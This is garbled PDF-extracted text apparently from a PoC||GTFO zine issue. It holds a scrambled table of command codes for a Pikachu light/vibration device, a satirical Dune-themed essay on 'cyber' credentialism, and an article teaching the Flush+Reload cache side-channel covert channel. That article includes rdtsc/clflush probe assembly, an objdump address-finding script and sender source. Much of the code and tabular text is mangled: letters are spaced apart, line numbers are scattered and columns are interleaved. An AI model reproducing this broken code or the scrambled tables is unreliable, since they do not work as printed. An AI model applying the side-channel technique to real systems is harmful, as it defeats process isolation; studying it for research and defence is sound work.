Light/Vibration (red, short)
Light/Vibration (red, medium)
Light (red)
Light (yellow/green)
Light (green)
Light (blue)
Light (purple)
Light (pale purple)
Light (magenta)
Light (pale green)
Light (cyan)
Light (pale blue/purple)
Light (gray)
Light (pattern purple, pale purple)
Light/Vibration (pale yellow, short)
Light/Vibration (pale yellow, short)
(no response)
(no response)
Self test/program mode? (reboots afterwards)
Light (pale yellow)
Light (pale blue)
Light (pale magenta)
SFX/Vibration (Normal)
SFX/Vibration (Fire)
SFX/Vibration (Water)
SFX/Vibration (Grass)
SFX/Vibration (Electric)
SFX/Vibration (Ice)
SFX/Vibration (Fighting)
SFX/Vibration (Poison)
10
08A:
08B:
08C:
08D:
08E:
08F:
090:
091:
092:
093:
094:
095:
096:
097:
098:
099:
09A:
09B:
09C:
09D:
09E:
09F:
0A0:
0A1:
0A2:
0A3:
0A4:
0A5:
0A6:
0A7:
0A8:
0A9:
0AA:
0AB:
0AC:
0AD:
0AE:
0AF:
0B0:
0B1:
0B2:
0B3:
0B4:
0B5:
0B6:
0B7:
0B8:
0B9:
0BA:
0BB:
0BC:
0BD:
0BE:
0BF:
0C0:
0C1:
0C2:
0C3:
0C4:
0C5:
0C6:
0C7:
0C8:
0C9:
0CA:
0CB:
0CC:
0CD:
0CE:
SFX/Vibration (Ground)
SFX/Vibration (Flying)
SFX/Vibration (Psychic)
SFX/Vibration (Bug)
SFX/Vibration (Rock)
SFX/Vibration (Ghost)
SFX/Vibration (Dragon)
SFX/Vibration (Dark)
SFX/Vibration (Steel)
SFX/Vibration (Fairy)
Pikachu 1
Pikachu 2
Pikachu 3
Pikachu 4
Pikachu 5
Vibration (speed 1, hard, 2x)
Vibration (speed 1, hard, 4x)
Vibration (speed 1, hard, 8x)
Vibration (speed 1, hard, 16x)
Vibration (speed 1, pattern, 2x)
Vibration (speed 1, pattern, 4x)
Vibration (speed 1, pattern, 8x)
Vibration (speed 1, pattern, 16x)
Vibration (speed 2, hard, 2x)
Vibration (speed 2, hard, 4x)
Vibration (speed 2, hard, 8x)
Vibration (speed 2, hard, 16x)
Vibration (speed 2, pattern, 2x)
Vibration (speed 2, pattern, 4x)
Vibration (speed 2, pattern, 8x)
Vibration (speed 2, pattern, 16x)
Vibration (speed 3, hard, 2x)
Vibration (speed 3, hard, 4x)
Vibration (speed 3, hard, 8x)
Vibration (speed 3, hard, 16x)
Vibration (speed 3, pattern, 2x)
Vibration (speed 3, pattern, 4x)
Vibration (speed 3, pattern, 8x)
Vibration (speed 3, pattern, 16x)
Vibration (speed 4, hard, 2x)
Vibration (speed 4, hard, 4x)
Vibration (speed 4, hard, 8x)
Vibration (speed 4, hard, 16x)
Vibration (speed 4, pattern, 2x)
Vibration (speed 4, pattern, 4x)
Vibration (speed 4, pattern, 8x)
Vibration (speed 4, pattern, 16x)
Vibration (speed 5, hard, 2x)
Vibration (speed 5, hard, 4x)
Vibration (speed 5, hard, 8x)
Vibration (speed 5, hard, 16x)
Vibration (speed 5, pattern, 2x)
Vibration (speed 5, pattern, 4x)
Vibration (speed 5, pattern, 8x)
Vibration (speed 6, hard, 16x)
Vibration (speed 6, hard, 2x)
Vibration (speed 6, hard, 4x)
Vibration (speed 6, hard, 8x)
Vibration (speed 6, hard, 16x)
Vibration (speed 6, pattern, 2x)
Vibration (speed 6, pattern, 4x)
Vibration (speed 6, pattern, 8x)
Vibration (speed 6, pattern, 16x)
Vibration (speed 7, hard, 2x)
Vibration (speed 7, hard, 4x)
Vibration (speed 7, hard, 8x)
Vibration (speed 7, hard, 16x)
Vibration (speed 7, pattern, 2x)
Vibration (speed 7, pattern, 4x)0CF:
0D0:
0D1:
0D2:
0D3:
0D4:
0D5:
0D6:
0D7:
0D8:
0D9:
0DA:
0DB:
0DC:
0DD:
0DE:
0DF:
0E0:
0E1:
0E2:
0E3:
0E4:
0E5:
0E6:
0E7:
0E8:
0E9:
0EA:
0EB:
0EC:
0ED:
0EE:
0EF:
0F0:
0F1:
0F2:
0F3:
0F4:
0F5:
0F6:
0F7:
0F8:
0F9:
0FA:
0FB:
0FC:
0FD:
0FE:
0FF:
100:
101:
102:
103:
104:
105:
106:
107:
108:
109:
10A:
10B:
10C:
10D:
10E:
10F:
110:
111:
112:
113:
114:
115:
116:
117:
118:
119:
11A:
11B:
11C:
11D:
11E:
11F:
120:
121:
122:
123:
124:
125:
126:
127:
128:
129:
12A:
12B:
12C:
12D:
12E:
12F:
130:
131:
132:
133:
134:
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
Vibration
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
(speed
7, pattern, 8x)
7, pattern, 16x)
8, hard, 2x)
8, hard, 4x)
8, hard, 8x)
8, hard, 16x)
8, pattern, 2x)
8, pattern, 4x)
8, pattern, 8x)
8, pattern, 16x)
9, hard, 2x)
9, hard, 4x)
9, hard, 8x)
9, hard, 16x)
9, pattern, 2x)
9, pattern, 4x)
9, pattern, 8x)
9, pattern, 16x)
10, hard, 2x)
10, hard, 4x)
10, hard, 8x)
10, hard, 16x)
10, pattern, 2x)
10, pattern, 4x)
10, pattern, 8x)
10, pattern, 16x)
11, hard, 2x)
11, hard, 4x)
11, hard, 8x)
11, hard, 16x)
11, pattern, 2x)
11, pattern, 4x)
11, pattern, 8x)
11, pattern, 16x)
12, hard, 2x)
12, hard, 4x)
12, hard, 8x)
12, hard, 16x)
12, pattern, 2x)
12, pattern, 4x)
12, pattern, 8x)
12, pattern, 16x)
13, hard, 2x)
13, hard, 4x)
13, hard, 8x)
13, hard, 16x)
13, pattern, 2x)
13, pattern, 4x)
13, pattern, 8x)
13, pattern, 16x)
14, hard, 2x)
14, hard, 4x)
14, hard, 8x)
14, hard, 16x)
14, pattern, 2x)
14, pattern, 4x)
14, pattern, 8x)
14, pattern, 16x)
15, hard, 2x)
15, hard, 4x)
15, hard, 8x)
15, hard, 16x)
15, pattern, 2x)
15, pattern, 4x)
15, pattern, 8x)
15, pattern, 16x)
16, hard, 2x)
16, hard, 4x)
16, hard, 8x)
16, hard, 16x)
16, pattern, 2x)
16, pattern, 4x)
16, pattern, 8x)
16, pattern, 16x)
17, hard, 2x)
17, hard, 4x)
17, hard, 8x)
17, hard, 16x)
17, pattern, 2x)
17, pattern, 4x)
17, pattern, 8x)
17, pattern, 16x)
18, hard, 2x)
18, hard, 4x)
18, hard, 8x)
18, hard, 16x)
18, pattern, 2x)
18, pattern, 4x)
18, pattern, 8x)
18, pattern, 16x)
19, hard, 2x)
19, hard, 4x)
19, hard, 8x)
19, hard, 16x)
19, pattern, 2x)
19, pattern, 4x)
19, pattern, 8x)
19, pattern, 16x)
20, hard, 2x)
20, hard, 4x)
20, hard, 8x)
20, hard, 16x)
135:
136:
137:
138:
139:
13A:
13B:
13C:
13D:
13E:
13F:
140:
141:
142:
143:
144:
145:
146:
147:
148:
149:
14A:
14B:
14C:
14D:
14E:
14F:
150:
151:
152:
153:
154:
155:
156:
157:
158:
159:
15A:
15B:
15C:
15D:
15E:
15F:
160:
161:
162:
163:
164:
165:
166:
167:
168:
169:
16A:
16B:
16C:
16D:
16E:
16F:
170:
171:
172:
173:
174:
175:
176:
177:
178:
179:
17A:
17B:
17C:
17D:
17E:
17F:
180:
181:
182:
183:
184:
185:
186:
187:
188:
189:
18A:
18B:
18C:
18D:
18E:
18F:
190:
191:
192:
193:
194:
195:
196:
197:
198:
199:
19A:
Vibration (speed 20, pattern, 2x)
Vibration (speed 20, pattern, 4x)
Vibration (speed 20, pattern, 8x)
Vibration (speed 20, pattern, 16x)
Vibration (speed 21, hard, 2x)
Vibration (speed 21, hard, 4x)
Vibration (speed 21, hard, 8x)
Vibration (speed 21, hard, 16x)
Vibration (speed 21, pattern, 2x)
Vibration (speed 21, pattern, 4x)
Vibration (speed 21, pattern, 8x)
Vibration (speed 21, pattern, 16x)
Vibration (speed 22, hard, 2x)
Vibration (speed 22, hard, 4x)
Vibration (speed 22, hard, 8x)
Vibration (speed 22, hard, 16x)
Vibration (speed 22, pattern, 2x)
Vibration (speed 22, pattern, 4x)
Vibration (speed 22, pattern, 8x)
Vibration (speed 22, pattern, 16x)
Vibration (soft, very long)
Pikachu 6
Pikachu 7
Pikachu 8
Pikachu 9
Pikachu 10
Pikachu 11
Pikachu 12
Light/Vibration (red, pattern 1)
Light/Vibration (red, pattern 2)
Light/Vibration (red, pattern 3)
Light/Vibration (red, pattern 4)
Light/Vibration (red, pattern 5)
Light/Vibration (red, pattern 6)
Light/Vibration (red, pattern 7)
Light/Vibration (red, pattern 8)
Light/Vibration (red, pattern 9)
Light/Vibration (red, pattern 10)
Light/Vibration (red, pattern 11)
Light/Vibration (red, pattern 12)
Light/Vibration (red, pattern 13)
Light/Vibration (red, pattern 14)
Light/Vibration (red, pattern 15)
Light/Vibration (red, pattern 16)
Light/Vibration (red, pattern 17)
Pikachu 13
Light (pale magenta)
Vibration (pattern 15)
Light/Vibration (pattern)
Light (pale yellow/green)
Light (pale blue/purple)
Light (magenta)
Light (yellow/green)
Light (cyan)
Light (pale blue)
Light (very pale blue)
Light (pale magenta)
Light (pale yellow)
Light/Vibration (blue, pattern 1)
Light/Vibration (blue, pattern 2)
Light/Vibration (blue, pattern 3)
Light/Vibration (blue, pattern 4)
Light/Vibration (blue, pattern 5)
Light/Vibration (blue, pattern 6)
Light/Vibration (blue, pattern 7)
Light/Vibration (blue, pattern 8)
Light/Vibration (blue, pattern 9)
Light/Vibration (blue, pattern 10)
Light/Vibration (blue, pattern 11)
Light/Vibration (blue, pattern 12)
Light/Vibration (blue, pattern 13)
Light/Vibration (blue, pattern 14)
Light/Vibration (blue, pattern 15)
Light/Vibration (blue, pattern 16)
Light/Vibration (blue, pattern 17)
Light/Vibration (blue, pattern 18)
Light/Vibration (green, pattern 1)
Light/Vibration (green, pattern 2)
Light/Vibration (green, pattern 3)
Light/Vibration (green, pattern 4)
Light/Vibration (green, pattern 5)
Light/Vibration (green, pattern 6)
Light/Vibration (green, pattern 7)
Light/Vibration (green, pattern 8)
Light/Vibration (green, pattern 9)
Light/Vibration (green, pattern 10)
Light/Vibration (green, pattern 11)
Light/Vibration (green, pattern 12)
Light/Vibration (green, pattern 13)
Light/Vibration (green, pattern 14)
Light/Vibration (green, pattern 15)
Light/Vibration (green, pattern 16)
Light/Vibration (green, pattern 17)
Light/Vibration (green, pattern 18)
Light/Vibration (yellow/green, pattern
Light/Vibration (yellow/green, pattern
Light/Vibration (yellow/green, pattern
Light/Vibration (yellow/green, pattern
Light/Vibration (yellow/green, pattern
Light/Vibration (yellow/green, pattern
Light/Vibration (yellow/green, pattern
Light/Vibration (yellow/green, pattern
11
1)
2)
3)
4)
5)
6)
7)
8)
19B:
19C:
19D:
19E:
19F:
1A0:
1A1:
1A2:
1A3:
1A4:
1A5:
1A6:
1A7:
1A8:
1A9:
1AA:
1AB:
1AC:
1AD:
1AE:
1AF:
1B0:
1B1:
1B2:
1B3:
1B4:
1B5:
1B6:
1B7:
1B8:
1B9:
1BA:
1BB:
1BC:
1BD:
1BE:
1BF:
1C0:
1C1:
1C2:
1C3:
1C4:
1C5:
1C6:
1C7:
1C8:
1C9:
1CA:
1CB:
1CC:
1CD:
1CE:
1CF:
1D0:
1D1:
1D2:
1D3:
1D4:
1D5:
1D6:
1D7:
1D8:
1D9:
1DA:
1DB:
1DC:
1DD:
1DE:
1DF:
1E0:
1E1:
1E2:
1E3:
1E4:
1E5:
1E6:
1E7:
1E8:
1E9:
1EA:
1EB:
1EC:
1ED:
1EE:
1EF:
1F0:
1F1:
1F2:
1F3:
1F4:
1F5:
1F6:
1F7:
1F8:
1F9:
1FA:
1FB:
1FC:
1FD:
1FE:
1FF:
Light/Vibration (yellow/green, pattern 9)
Light/Vibration (yellow/green, pattern 10)
Light/Vibration (yellow/green, pattern 11)
Light/Vibration (yellow/green, pattern 12)
Light/Vibration (yellow/green, pattern 13)
Light/Vibration (yellow/green, pattern 14)
Light/Vibration (yellow/green, pattern 15)
Light/Vibration (yellow/green, pattern 16)
Light/Vibration (yellow/green, pattern 17)
Light/Vibration (yellow/green, pattern 18)
Light/Vibration (purple, pattern 1)
Light/Vibration (purple, pattern 2)
Light/Vibration (purple, pattern 3)
Light/Vibration (purple, pattern 4)
Light/Vibration (purple, pattern 5)
Light/Vibration (purple, pattern 6)
Light/Vibration (purple, pattern 7)
Light/Vibration (purple, pattern 8)
Light/Vibration (purple, pattern 9)
Light/Vibration (purple, pattern 10)
Light/Vibration (purple, pattern 11)
Light/Vibration (purple, pattern 12)
Light/Vibration (purple, pattern 13)
Light/Vibration (purple, pattern 14)
Light/Vibration (purple, pattern 15)
Light/Vibration (purple, pattern 16)
Light/Vibration (purple, pattern 17)
Light/Vibration (purple, pattern 18)
Light/Vibration (yellow, pattern 1)
Light/Vibration (yellow, pattern 2)
Light/Vibration (yellow, pattern 3)
Light/Vibration (yellow, pattern 4)
Light/Vibration (yellow, pattern 5)
Light/Vibration (yellow, pattern 6)
Light/Vibration (yellow, pattern 7)
Light/Vibration (yellow, pattern 8)
Light/Vibration (yellow, pattern 9)
Light/Vibration (yellow, pattern 10)
Light/Vibration (yellow, pattern 11)
Light/Vibration (yellow, pattern 12)
Light/Vibration (yellow, pattern 13)
Light/Vibration (yellow, pattern 14)
Light/Vibration (yellow, pattern 15)
Light/Vibration (yellow, pattern 16)
Light/Vibration (yellow, pattern 17)
Light/Vibration (yellow, pattern 18)
Light/Vibration (white, pattern 1)
Light/Vibration (white, pattern 2)
Light/Vibration (white, pattern 3)
Light/Vibration (white, pattern 4)
Light/Vibration (white, pattern 5)
Light/Vibration (white, pattern 6)
Light/Vibration (white, pattern 7)
Light/Vibration (white, pattern 8)
Light/Vibration (white, pattern 9)
Light/Vibration (white, pattern 10)
Light/Vibration (white, pattern 11)
Light/Vibration (white, pattern 12)
Light/Vibration (white, pattern 13)
Light/Vibration (white, pattern 14)
Light/Vibration (white, pattern 15)
Light/Vibration (white, pattern 16)
Light/Vibration (white, pattern 17)
Light/Vibration (white, pattern 18)
Light/Vibration (red, medium)
Light/Vibration (yellow/green, medium)
Light/Vibration (green, medium)
Light/Vibration (blue, very short)
Light/Vibration (blue, short)
Light/Vibration (blue, medium)
Light/Vibration (green, very short)
Light/Vibration (green, short)
Light/Vibration (green, medium)
Light/Vibration (yellow/green, very short)
Light/Vibration (yellow/green, short)
Light/Vibration (yellow/green, medium)
Light/Vibration (purple, very short)
Light/Vibration (purple, short)
Light/Vibration (purple, medium)
Light/Vibration (yellow, very short)
Light/Vibration (yellow, short)
Light/Vibration (yellow, medium)
Light/Vibration (white, very short)
Light/Vibration (white, short)
Light/Vibration (white, medium)
Light/Vibration (red, pattern 18)
Light (red, indefinite)
Light (yellow, indefinite)
Light (green, indefinite)
Light (blue, indefinite)
Light (purple, indefinite)
Light (pattern, indefinite)
SFX/Light (sparkle, gray)
(turn off light)
Light/Vibration (blue, medium)
Light/Vibration (pale purple, medium)
Light/Vibration (pattern, medium)
(no response)
(no response)
(no response)
(no response)14:03
Concerning Desert Studies, Cyberwar, and the Desert Power
by Naib Manul Laphroaig 7
Gather round, neighbors, as we close the mois-
ture seals and relax the water discipline. Take off
your face masks and breathe the sietch air freely. It
is time for a story of the things that were and the
things that will come.
Knowledge and water. These are the things that
rule the universe. They are alike—and one truly
needs to lack them to appreciate their worth. Those
who have them in abundance proclaim their value—
and waste them thoughtlessly, without a care. They
make sure their wealth and their education degrees
are on display for the world, and ever so hard to
miss; they waste both time and water to put us in
our place. Yet were they to see just one of our hid-
den caches, they would realize how silly their dis-
plays are in comparison.
For while they pour out the water and the time
of their lives, and treat us as savages and dismiss us,
we are working to change the face of the world.
Their scientists have imperial ranks, and their
city schools teach—before and above any useful
subject—respect for these ranks and for those who
pose as “scientists” on the imperial TV. And yet,
guess who knows more physics, biology, and plane-
tary ecology that matters. Guess who knows how
their systems actually work, from the smallest wa-
ter valve in a stillsuit to the ecosystems of an entire
planet. They mock Shai-hulud and dismiss us Fre-
men as the unwashed rabble tinkering to survive in
the desert—yet their degrees don’t impress the sand.
The works of the ignorant are like sand. When
yet sparse, they merely vex and irritate like loose
grains; when abundant, they become like dunes that
overwhelm all water, life, and knowledge. Verily,
these are the dunes where knowledge goes to die.
As the ignorant labor, sand multiplies, until it cov-
ers the face of the world and pervades every breath
of the wind.
And then there was a Dr. Kynes. To imperial
paymasters, he was just another official on the long
roll getting ever longer. To the people of the city he
was just another bureaucrat to avoid if they could,
or to bribe if they couldn’t. To his fellow civil
servants—who considered themselves scholars, yet
spent more time over paperwork than most clerks—
he was an odd case carrying on about things that
mattered nothing to one’s career, as absolutely ev-
erybody knew; in short, they only listened to him if
they felt charitable at the moment.
For all these alleged experts, the order of life
was already scientifically organized about the best
it could be. One would succeed by improving the
standard model of a stillsuit, or just as well by sell-
ing a lot of crappy ones.
One did not succeed by talking about chang-
ing a planet. Planets were already as organized as
they could be. A paper could be written, of course,
but, to be published, the paper had to have both
neatly tabulated results and a summary of prior
work. There was no prior published work on chang-
ing planets, no journals devoted to it, and no out-
standing funding solicitations. One would not even
get invited to lecture about it. It was a waste of
7 Naib Laphroiag, an early follower of Muad’dib, is sometimes incorrectly said to have composed the Litany against Cyber
(“I shall not cyber. Cyber is the mind-killer that brings bullshit. I will face cyber and let it pass over me. When the bullshit
has gone, only PoC of how nifty things really work will remain.”) It had, in fact, originated with early Butlerians, but the
Naib carried it to neighbors far and wide over the sand wherever it needed to be heard.
12time, useless for advancement in rank.
Besides, highly ranked minds must have already
thought about it, and did not take it up; clearly, the
problem was intractable. Indeed, weren’t there al-
ready dissertations on the hundred different aspects
of sand, and of desert plants, and of the native ani-
mals and birds? There were even some on the silly
native myths. Getting on the bad side of the water-
sellers, considering how much they were donating
to the cause of higher learning, was also not a wise
move.
But Kynes knew a secret: knowledge was wa-
ter, and water was knowledge. The point of knowl-
edge was to provide what was needed the most, not
ranks or lectures. And he knew another secret: one
could, in fact, figure out a thing that many superior
minds hadn’t bothered with, be it even the size of
the planet. And he may have guessed a third se-
cret: if someone didn’t value water as life, there was
no point of talking to them about water, or about
knowledge. They would, at best, nod, and then go
about their business. It is like spilling water on the
sand.
That did not leave Kynes with a lot of options.
In fact, it left him with none at all. And so he did a
thing that no one else had done before: he left the
city and walked out onto the sand. He went to find
us, and he became Liet.
For those who live on the sand and are sur-
rounded by it understand the true value of water,
and of figuring things out, be they small or large.
This Kynes sought, and this he found—with us, the
Fremen.
His manner was odd to us, but he knew things of
the sand that no city folk cared to know; he spoke
of water in the sand as we heard none speak before.
He must have figured it out—and there were just
enough of us who knew that figuring things out was
water and life. And so he became Liet.
His knowledge, rejected by bureaucrats, already
turned into a water wealth no bureaucrat can yet
conceive of. His peers wrote hundreds of thousands
of papers since he left, and went on to higher ranks—
and all of these will be blown away by the desert
winds. A lot of useless technology will be sold and
ground into dust on the sand—while Liet’s words are
changing the desert slowly but surely.
Something strange has been going of late in their
sheltered cities. There is talk of a “sand-war,” and
of “sand warriors,” and of “sand power.” They are
giving sand new names, and new certifications of
“desert moisture security professionals” to their city
plumbers. Their schools are now supposed to teach
something they called SANDS, “Science, Agronomy,
Nomenclature, 8 Desert Studies,” to deliver a “sand
superiority.” Their imperial news spread rumors
of “anonymous senior imperial officials” unleashing
“sand operations,” the houses major building up
their “sand forces” and the houses minor demand-
ing an investigation in the Landsraat.
Little do they know where the true sand power
lies, and where the actual water and knowledge are
being accumulated to transform the desert.
The sand will laugh at them—and one day the
one who understands the true source of power will
come after Liet, the stored water will come forth,
the ecology will change—and a rain will fall.
Until then, we will keep the water and the knowl-
edge. Until then, we, the Fremen, will train the new
generations of those who know and those who figure
things out!
8 Truly, they believe that teaching and learning is repetition of words, and that their things break on the sand because they
are named wrong. Change the words, and everything will work on the sand! Hear the sandstorm roaring with laughter above
the dunes, and the great Shai-hulud writhing with it below!
1314:04
Flush+Reload
by Taylor Hornby
Dear Editors and Readers of PoCkGTFO,
You’ve been lied to about how your computer
works. You see, in a programming class they teach
you just enough for you to get on with your job and
no more. What you learn is a mere abstraction of the
very complicated piece of physics sitting under your
desk. To use your computer to its fullest potential,
you must forget the familiar abstraction and finally
see your computer for what it really is. Come with
me, as we take a small step towards enlightenment.
You know what makes a computer—or so you
think. There is a processor. There is a bank of main
memory, which the processor reads, writes, and ex-
ecutes from. And there are processes, those entities
that from time to time get loaded into the processor
to do their work.
The gist is this: the cache remembers recently
executed code, which means that it must also re-
member which code was recently executed. Pro-
cesses are in control of the code they execute, so
what we can do is execute a special pattern of code
that the cache will remember. When the second
process gets a chance to run, it will read the pattern
out of the cache and recover the message. Oh how
thoughtful it was of the processor designers to add
this feature!
The undocumented feature we’ll be using is
called “Flush+Reload,” and it was originally discov-
ered by Yuval Yarom and Katrina Falkner. 9 It’s
available in most modern Intel processors, so if
you’ve got one of those, you should be able to follow
along.
As we know, processes shouldn’t be trusted to
play well together, and need to be kept separate.
Many of the processor’s features were added to keep
those processes isolated. It would be quite bad if
one process could talk to another without the sys-
tem administrator’s permission.
We also know that the faster a computer is, the
more work it can do and the more useful it is. Even
more features were introduced to the processor in
order to make it go as fast as possible.
Accordingly, your processor most likely has a
memory cache sitting between main memory and
the processor, remembering recently-read data and
code, so that the next time the processor reads from
the same address, it doesn’t have to reach all the
way out to main memory. The vendors will say this
feature was added to make the processor go faster,
and it does do a great job of that. But I will show
you that the cache is also a feature to help hack-
ers get around those annoying access controls that
system administrators seem to love.
What I’m going to do is show you how to send
a text message from one process to the other, using
only memory reads. What!? How could this be pos-
sible? According to your programming class, you
say, reads from memory are just reads, they can’t
be used to send messages!
9 Usenix
Security 2014
1415It works like this. When Sally the Sender pro-
cess gets loaded into memory, one copy of all her ex-
ecuted code gets loaded into main memory. When
Robert the Receiver process loads Sally’s binary into
his address space, the operating system isn’t going
to load a second copy: that would be wasteful. In-
stead, it’s just going to point Robert’s page tables
at Sally’s memory. If Sally and Robert could both
write to the memory, it would be a huge problem
since they could simply talk by writing messages to
each other in the shared memory. But that isn’t a
problem, because one of those processor security fea-
tures stops both Sally and Robert from being able
to write to the memory. How do they communicate
then?
When Sally the Sender executes some of her
code, the cache—the last-level cache, to be specific—
is going to remember her most recently executed
code. When Robert the Receiver reads a chunk of
code in Sally’s binary, the read operation is going to
be sent through the very same cache. So: if Sally
ran the code not too long ago, Robert’s read will
happen very fast. If Sally hasn’t run the code in a
while, Robert’s read is going to be slow.
1 __attribute__ ( ( a l w a y s _ i n l i n e ) )
i n l i n e unsigned long probe ( char ∗ a d r s ) {
3
v o l a t i l e unsigned long time ;
5
asm __volatile__ (
" mfence
" lfence
" rdtsc
" lfence
" movl %%eax , %%e s i
" movl (%1) , %%eax
" lfence
" rdtsc
" s u b l %%e s i , %%eax
"
c l f l u s h 0(%1)
: "=a " ( time )
: "c" ( adrs )
: "%e s i " , "%edx " ) ;
return time ;
7
9
11
13
15
17
19
\n"
\n"
\n"
\n"
\n"
\n"
\n"
\n"
\n"
\n"
}
By repeatedly running this code on those special
probe sites in Sally’s binary, Robert will see which
letters Sally is sending. Robert just needs to know
where those probe sites are. It’s a matter of filter-
ing the output of objdump to find those addresses,
which can be done with this handy script:
Sally and Robert are going to agree ahead of time
on 27 locations in Sally’s binary. That’s one location 2
for each letter of the alphabet, and one left over for
4
the space character. To send a message to Robert,
Sally is going to spell out the message by executing 6
the code at the location for the letter she wants to
send. Robert is going to continually read from all 27 8
locations in a loop, and when one of them happens 10
faster than usual, he’ll know that’s a letter Sally just
12
sent.
Figure 1 contains the source code for Sally’s bi-
nary. Notice that it doesn’t even explicitly make
any system calls.
This program takes a message to send on the
command-line and simply passes the processor’s
thread of execution over the probe site correspond-
ing to that character. To have Sally send the
message “THE QUICK BROWN FOX JUMPS OVER THE
LAZY DOG” we just compile it without optimizations,
then run it.
But how does Robert receive the message?
Robert runs the program whose source code is at
flush-reload/myversion. The key to that pro-
gram is this bit of code, which times how long it
takes to read from an address, and then flushes it
from the cache.
#! / b i n / b a s h
f o r l e t t e r in {A . . Z}
do
addr=$ ( objdump −D − M i n t e l msg
sed −n −e "/< $ l e t t e r >/ ,\ $p "
g r e p c a l l | head −n 1
c u t −d ’ : ’ −f 1 | t r −d ’ ’ )
echo −n "−p $ l e t t e r : 0 x$addr "
done
addr=$ ( objdump −D − M i n t e l msg
sed −n −e "/<SP>/ ,\ $p "
g r e p c a l l | head −n 1
c u t −d ’ : ’ −f 1 | t r −d ’ ’ ) ;
14 echo "−p _: 0 x$addr "
| \
| \
| \
;
| \
| \
| \
Assuming this script works, it will output a list of
command-line arguments for the receiver, enumerat-
ing which addresses to watch for getting entered into
the cache:
−p
2 −p
−p
4 −p
−p
6 −p
−p
8 −p
−p
16
A: 0 x 4 0 7 c c 5
D: 0 x 4 3 4 c f 5
G: 0 x461d25
J : 0 x48ed55
M: 0 x4bbd85
P : 0 x4e8db5
S : 0 x515de5
V: 0 x542e15
Y: 0 x 5 6 f e 4 5
−p
−p
−p
−p
−p
−p
−p
−p
−p
B: 0 x416cd5
E : 0 x443d05
H: 0 x470d35
K: 0 x49dd65
N: 0 x4cad95
Q: 0 x 4 f 7 d c 5
T: 0 x 5 2 4 d f 5
W: 0 x551e25
Z : 0 x57ee55
−p
−p
−p
−p
−p
−p
−p
−p
−p
C: 0 x 4 2 5 c e 5
F : 0 x452d15
I : 0 x47fd45
L : 0 x4acd75
O: 0 x4d9da5
R: 0 x506dd5
U: 0 x533e05
X: 0 x560e35
_: 0 x58de651
3
5
7
9
11
13
15
17
19
21
23
/∗ msg . c − Send a m e s s a g e t h r o u g h t h e F l u s h+R e l o a d
∗ W r i t t e n T a y l o r Hornby f o r PoC | | GTFO 0 x14 .
∗/
// We s u r r o u n d t h e p r o b e s i t e s w i t h p a d d i n g .
// d i f f e r e n t p a g e f r a m e s w h i c h r e d u c e s n o i s e
unsigned i n t p a d d i n g = 0 ;
#d e f i n e PADDING_A p a d d i n g += 1 ;
#d e f i n e PADDING_B PADDING_A PADDING_A
#d e f i n e PADDING_C PADDING_B PADDING_B
#d e f i n e PADDING_D PADDING_C PADDING_C
#d e f i n e PADDING_E PADDING_D PADDING_D
#d e f i n e PADDING_F PADDING_E PADDING_E
#d e f i n e PADDING_G PADDING_F PADDING_F
#d e f i n e PADDING_H PADDING_G PADDING_G
#d e f i n e PADDING_I PADDING_H PADDING_H
#d e f i n e PADDING_J PADDING_I PADDING_I
#d e f i n e PADDING_K PADDING_J PADDING_J
#d e f i n e PADDING
PADDING_K PADDING_K
cache
s i d e −c h a n n e l .
T h i s makes s u r e t h e y ’ r e
from p r e f e t c h i n g , e t c .
in
// The p r o b e s i t e s w i l l b e c a l l i n s t r u c t i o n s t o t h i s empty f u n c t i o n . I t
// d o e s n ’ t h a v e t o b e a c a l l i n s t r u c t i o n ; i t ’ s j u s t e a s y t o g r e p f o r .
void n u l l ( ) { }
#d e f i n e PROBE n u l l ( ) ;
25
27
29
31
33
35
37
39
// One p r o b e s i t e f o r e a c h l e t t e r o f t h e a l p h a b e t and
void A ( ) { PADDING PROBE PADDING } void B ( ) { PADDING
void C ( ) { PADDING PROBE PADDING } void D( ) { PADDING
void E ( ) { PADDING PROBE PADDING } void F ( ) { PADDING
void G( ) { PADDING PROBE PADDING } void H ( ) { PADDING
void I ( ) { PADDING PROBE PADDING } void J ( ) { PADDING
void K( ) { PADDING PROBE PADDING } void L ( ) { PADDING
void M( ) { PADDING PROBE PADDING } void N ( ) { PADDING
void O( ) { PADDING PROBE PADDING } void P ( ) { PADDING
void Q( ) { PADDING PROBE PADDING } void R ( ) { PADDING
void S ( ) { PADDING PROBE PADDING } void T ( ) { PADDING
void U ( ) { PADDING PROBE PADDING } void V ( ) { PADDING
void W( ) { PADDING PROBE PADDING } void X ( ) { PADDING
void Y ( ) { PADDING PROBE PADDING } void Z ( ) { PADDING
void SP ( ) { PADDING PROBE PADDING }
space .
PROBE PADDING
PROBE PADDING
PROBE PADDING
PROBE PADDING
PROBE PADDING
PROBE PADDING
PROBE PADDING
PROBE PADDING
PROBE PADDING
PROBE PADDING
